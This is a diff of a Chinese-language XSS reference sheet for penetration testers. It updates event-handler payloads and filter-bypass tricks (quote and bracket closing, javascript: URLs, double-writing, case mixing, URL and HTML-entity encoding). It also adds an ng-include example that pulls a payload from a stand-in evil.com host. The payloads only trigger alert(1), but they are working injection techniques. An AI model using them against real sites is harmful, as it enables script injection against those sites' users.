@@ -21,10 +21,10 @@ Host: example.com
 <input value="test" type="text">
 ```
 
-若搜索的内容是一段 Payload, 如： `"onclick="alert(1)"` 那么就会在浏览器注入 XSS
+若搜索的内容是一段 Payload, 如： `"onclick=alert(1)"` 那么就会在浏览器注入 XSS
 
 ```
-<input value=""onclick="alert(1)"" type="text">
+<input value=""onclick=alert(1)"" type="text">
 ```
 
 ### 1.1. 存在位置
@@ -68,42 +68,42 @@ Host: example.com
 加载事件
 
 ```
-onload="alert(1)"	     # 元素加载完成时触发
-onerror="alert(1)"	     # 元素加载失败时触发
+onload=alert(1)	         # 元素加载完成时触发
+onerror=alert(1)         # 元素加载失败时触发
 ```
 
 鼠标事件
 
 ```
-onclick="alert(1)"	     # 点击元素时触发
-ondblclick="alert(1)"    # 双击元素时触发
-oncontextmenu="alert(1)" # 右击元素时触发
-onmousemove="alert(1)"	 # 鼠标移动到元素上方时触发
-onmouseover="alert(1)"	 # 鼠标悬停在元素上方时触发
-onmousedown="alert(1)"	 # 鼠标按下时触发
-onmouseup="alert(1)"	 # 鼠标松开时触发
-onmouseenter="alert(1)"  # 鼠标进入元素时触发
-onmouseleave="alert(1)"  # 鼠标离开元素时触发
+onclick=alert(1)	     # 点击元素时触发
+ondblclick=alert(1)      # 双击元素时触发
+oncontextmenu=alert(1)   # 右击元素时触发
+onmousemove=alert(1)	 # 鼠标移动到元素上方时触发
+onmouseover=alert(1)	 # 鼠标悬停在元素上方时触发
+onmousedown=alert(1)	 # 鼠标按下时触发
+onmouseup=alert(1)	     # 鼠标松开时触发
+onmouseenter=alert(1)    # 鼠标进入元素时触发
+onmouseleave=alert(1)    # 鼠标离开元素时触发
 ```
 
 表单事件
 
 ```
-onfocus="alert(1)"        # 元素获得焦点
-onblur="alert(1)"         # 元素失去焦点
-oninput="alert(1)"        # 用户输入时触发
-onselect="alert(1)"       # 用户选中文本时触发
-onsubmit="alert(1)"       # 表单提交时触发
-onreset="alert(1)"        # 表单重置时触发
-onchange="alert(1)"       # 输入框, 下拉框等内容变更后失焦
+onfocus=alert(1)        # 元素获得焦点
+onblur=alert(1)         # 元素失去焦点
+oninput=alert(1)        # 用户输入时触发
+onselect=alert(1)       # 用户选中文本时触发
+onsubmit=alert(1)       # 表单提交时触发
+onreset=alert(1)        # 表单重置时触发
+onchange=alert(1)       # 输入框, 下拉框等内容变更后失焦
 ```
 
 键盘事件
 
 ```
-onkeydown="alert(1)"      # 按键按下
-onkeypress="alert(1)"     # 按键按下并产生字符
-onkeyup="alert(1)"        # 按键释放
+onkeydown=alert(1)      # 按键按下
+onkeypress=alert(1)     # 按键按下并产生字符
+onkeyup=alert(1)        # 按键释放
 ```
 
 ## 2. 数据提交类
@@ -212,53 +212,82 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 
 ## 4. Bypass
 
-将隐藏类型转换为可见类型
-
-```
-type="hidden"
-type="text"
-```
-
 引号闭合插入事件绕过
 
 ```
-" onclick="alert(1)"
+" onclick=alert(1)
 ```
 
 尖括号闭合插入标签绕过
 
 ```
-"><img/src/onerror="alert(1)">
+"><img/src/onerror=alert(1)>
 ```
 
 `href` 伪协议绕过
 
 ```
-<a href="javascript:alert(1)">1</a>
+<a href=javascript:alert(1)>1</a>
 ```
 
 双写绕过
 
 ```
-<a href="javascjavascriptript:alert(1)">1</a>
+<a href=javascjavascriptript:alert(1)>1</a>
 ```
 
 大小写绕过
 
 ```
-<a href="jaVaScRipT:alert(1)">1</a>
+<a href=jaVaScRipT:alert(1)>1</a>
 ```
 
 URL 编码绕过
 
 ```
-%22%3e%3cimg%2fsrc%2fonerror%3d%22alert%281%29%22%3e
+%27%22%3E%20%3Cimg%2Fsrc%2Fonerror%3Dalert%281%29%3E
 ```
 
 添加 HTML 编码后的 Tab 绕过
 
 ```
-<a href="javasc&#09;ript:alert(1)">1</a>
+<a href=javasc&#09;ript:alert(1)>1</a>
+```
+
+## 5. 特殊情况
+
+### 5.1. hidden
+
+某些注入点可能被 `hidden` 隐藏
+
+```
+<input vule="payload" type="hidden">
+```
+
+修改为 `text` 即可
+
+```
+<input vule="payload" type="text">
+```
+
+### 5.2. ng-include
+
+`ng-include` 可引入一个 URL 
+
+```
+<body><span class="ng-include:payload"></span></body>
+```
+
+若引入的 URL 存在 XSS 则可能对在当前网站生效
+
+```
+<body><span class="ng-include:'https://evil.com/xss.php?payload=<img/src/onerror=alert(1)>'"></span></body>
+```
+
+默认情况下 ng-include 只能引入当前网站的 URL
+
+```
+<body><span class="ng-include:'/xss.php?payload=<img/src/onerror=alert(1)>'"></span></body>
 ```
 
 ## ==未归纳==
@@ -429,10 +458,10 @@ hello:expr/**/ession(alert(1))
 ---
 
 - [CWE-79](https://hackerone.com/hacktivity/cwe_discovery?id=cwe-79)
-- [全角尖括号绕过](https://hackerone.com/reports/639684)
-- [在线 Markdown 渲染链接时将标题与链接拼接](https://hackerone.com/reports/526325)
-- [HTML 编码 + 下划线混淆 + 全角引号绕过](https://hackerone.com/reports/484434)
-- [表情符号触发 XSS](https://mp.weixin.qq.com/s/lF53d_DHEnYhch_H3R82DQ)
-- [xss bypass备忘单](https://www.ddosi.org/xss-bypass/)
+- [The return of the ＜](https://hackerone.com/reports/639684)
+- [Stored XSS in Wiki pages](https://hackerone.com/reports/526325)
+- [Stored XSS on imgur profile](https://hackerone.com/reports/484434)
+- [尖括号被过滤无法闭合?有没有尝试过用表情符号触发的XSS？](https://mp.weixin.qq.com/s/lF53d_DHEnYhch_H3R82DQ)
+- [xss bypass备忘单|xss绕过防火墙技巧|xss绕过WAF的方法](https://www.ddosi.org/xss-bypass/)
 - [DiscuzX2个人空间图片EXIF信息XSS](https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2012-07468)
 
